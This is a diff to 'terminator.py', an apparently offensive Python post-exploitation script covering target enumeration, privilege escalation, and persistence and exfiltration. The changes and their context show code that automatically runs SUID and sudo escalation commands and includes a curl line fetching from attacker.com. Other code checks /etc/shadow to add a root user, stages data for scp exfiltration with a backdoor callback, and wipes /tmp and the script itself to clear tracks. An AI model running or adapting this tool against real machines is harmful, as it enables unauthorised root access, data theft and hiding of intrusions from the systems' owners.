@@ -12,7 +12,7 @@
 #
 # usage: (stage 1-enumerating target from local machine): python3 terminator.py enum -t <target_ip_to_enumerate> (optional: -w <path_to_directory_wordlist> (otherwise, terminator will use default list))
 #
-# usage: (stage 2-privilege escalation after gaining shell on target machine): python3 terminator.py priv
+# usage: (stage 2-privilege escalation after gaining shell on target machine): python3 terminator.py priv -u <new_root_username> -p <new_root_passwd> 
 #
 # usage: (stage 3-persistence/data exfiltration after gaining root privileges on target machine): python3 terminator.py root -u <new_user_name> -p <new_user_passwd> -l <local_ip> -x <local_listening_port> (optional: -f (bypass root permissions check))
 #
@@ -30,8 +30,8 @@ parser = argparse.ArgumentParser(description="script for automating common pente
 parser.add_argument("level", help="use terminator to enumerate target machine from local machine")
 parser.add_argument("-t", "--targetip", help="(enum) specify target ip to enumerate")
 parser.add_argument("-w", "--wordlist", help="(enum) specify wordlist for directory walking (gobuster)")
-parser.add_argument("-u", "--username", help="(root) specify the username you want for the new user")
-parser.add_argument("-p", "--password", help="(root) specify the password you want for the new user")
+parser.add_argument("-u", "--username", help="(priv/root) specify the username you want for the new user")
+parser.add_argument("-p", "--password", help="(priv/root) specify the password you want for the new user")
 parser.add_argument("-l", "--localip", help="(root) specify your (local) ip for data exfiltration and backdoor callback")
 parser.add_argument("-x", "--localport", help="(root) specify your (local) port for backdoor callback")
 parser.add_argument("-f", "--force", help="(root) force bypass of root permissions check (optional)", required=False, action="store_true")
@@ -219,7 +219,7 @@ def disable_hist():
 
 # check for binaries that can be run as sudo and print privesc script to screen
 def sudo_l():
-   os.system("echo '### sudo-l results ###' > /tmp/sudo_l.txt")
+   os.system("echo '### sudo-l results ###' >> /tmp/sudo_l.txt")
    os.system("echo ' ' >> /tmp/sudo_l.txt")
    print("\n###--- please run 'sudo -l >> /tmp/sudo_l.txt' before running this script to find sudoable commands ---###")
    time.sleep(5)
@@ -284,7 +284,7 @@ def sudo_l():
       for key in sudo_bins_print:
          if key in lower_line:
             print("{}: {}".format(key,sudo_bins_print[key]))
-            os.system("echo '{}:{} can be used for privilege escalation' >> /tmp/esc.txt".format(key,sudo_bins_print[key]))
+            os.system("echo '{}:{} ### can be used for privilege escalation ###' >> /tmp/esc.txt".format(key,sudo_bins_print[key]))
             continue
          else:
             continue
@@ -292,7 +292,7 @@ def sudo_l():
       for key in sudo_bins_exec:
          if key in lower_line:
             print("{}: {}".format(key,sudo_bins_exec[key]))
-            os.system("echo '### {}:{} can be used for privilege escalation ###' >> /tmp/esc.txt".format(key,sudo_bins_print[key]))
+            os.system("echo '{}:{} ### can be used for privilege escalation ###' >> /tmp/esc.txt".format(key,sudo_bins_print[key]))
             sudo_cmd = sudo_bins_exec[key].strip()
             print(sudo_cmd)
             time.sleep(5)
@@ -308,6 +308,7 @@ def sudo_l():
 def suid():
    print("\n### finding SUID files... ###")
    os.system("echo '### suid file search results ###' > /tmp/suid.txt")
+   os.system("echo ' ' >> /tmp/sudo_l.txt")
 
    suid_bins_print = {
    "curl":"URL=http://attacker.com/file_to_get\nLFILE=file_to_save\n./curl $URL -o $LFILE",
@@ -347,7 +348,7 @@ def suid():
    }
 
    # find suid binaries, loop through dictionaries and print cmds if need user interaction, otherwise execute
-   os.system("find / -type f -perm /4000 2>/dev/null | tee -a /tmp/suid.txt")
+   os.system("find / -type f -perm /4000 2>/dev/null >> /tmp/suid.txt")
    with open("/tmp/suid.txt") as suid_file:
       suid = suid_file.readlines()
       for line in suid:
@@ -366,7 +367,7 @@ def suid():
          for key in suid_bins_exec:
             if key in suid:
                print("\n{}: {}".format(key,suid_bins_exec[key]))
-               os.system("echo '### {} is a suid file and can be used for privilege escalation ###' >> /tmp/suid_esc.txt".format(key,suid_bins_exec[key]))
+               os.system("echo '### {} is a suid file and can be used for privilege escalation ###' >> /tmp/suid_esc.txt".format(key))
                suid_cmd = value.strip()
                os.system("{}".format(suid_cmd))
                break
@@ -385,7 +386,7 @@ def path():
    "git", "gh", "vi", "nano"]
 
    os.system("mkdir /tmp/.path/")
-   os.system("echo '### possible undefined $PATH binary vulnerabilities ###' >> /tmp/path_res.txt")
+   os.system("echo '### possible undefined $PATH binary vulnerabilities ###' > /tmp/path_res.txt")
    os.system("find / -type f -perm /4000 2>/dev/null > /tmp/path.txt")
    print("\n### finding SUID executables that don't specify full path (for $PATH exploit) ###")
    with open("/tmp/path.txt") as root_files:
@@ -393,7 +394,7 @@ def path():
       for line in lines:
          split_path = line.split("/")
          split_path_1 = split_path[-1].strip()
-         os.system("strings {} > /tmp/.path/root_{}".format(line,split_path_1))
+         os.system("strings {} 1>/dev/null > /tmp/.path/root_{}".format(line,split_path_1))
          with open("/tmp/.path/root_{}".format(split_path_1)) as strings_file:
             lines_strings = strings_file.readlines()
             for cmd in common_cmds:
@@ -440,6 +441,17 @@ def pass_shadow(username,password):
       else:
          print("\n*** /etc/shadow is not writable ***")
    pass_file.close()
+
+   # print results to screen
+   os.system("touch /tmp/print.txt")
+   os.system("cat /tmp/esc.txt >> /tmp/sudo_l.txt")
+   os.system("cat /tmp/sudo_l.txt >> /tmp/print.txt")
+   os.system("cat /tmp/suid_esc.txt >> /tmp/suid.txt")
+   os.system("cat /tmp/suid.txt >> /tmp/print.txt")
+   os.system("cat /tmp/path_res.txt >> /tmp/print.txt")
+   os.system("cat /tmp/passwd_res.txt >> /tmp/print.txt")
+   os.system("cat /tmp/shad_res.txt >> /tmp/print.txt")
+   os.system("cat /tmp/print.txt")
 
 
 # check for root
@@ -556,9 +568,7 @@ def extract(username,password,local_ip,local_port):
    os.system("find / type -f perm /4000 2>/dev/null | tee -a /tmp/data_exfil.txt")
 
    # compile previous files into one for scp
-   os.system("cat /tmp/esc.txt >> /tmp/sudo_l.txt")
    os.system("cat /tmp/sudo_l.txt >> /tmp/priv.txt")
-   os.system("cat /tmp/suid_esc.txt >> /tmp/suid.txt")
    os.system("cat /tmp/suid.txt >> /tmp/priv.txt")
    os.system("cat /tmp/path_res.txt >> /tmp/priv.txt")
    os.system("cat /tmp/passwd_res.txt >> /tmp/priv.txt")
@@ -610,6 +620,7 @@ def clear_tracks():
    os.system("rm -f /tmp/passwd_res.txt")
    os.system("rm -f /tmp/shad_res.txt")
    os.system("rm -f /tmp/priv.txt")
+   os.system("rm -f /tmp/print.txt")
    os.system("rm -rf /tmp/* 2>/dev/null")
    os.system("rm -f terminator.py")
    exit()
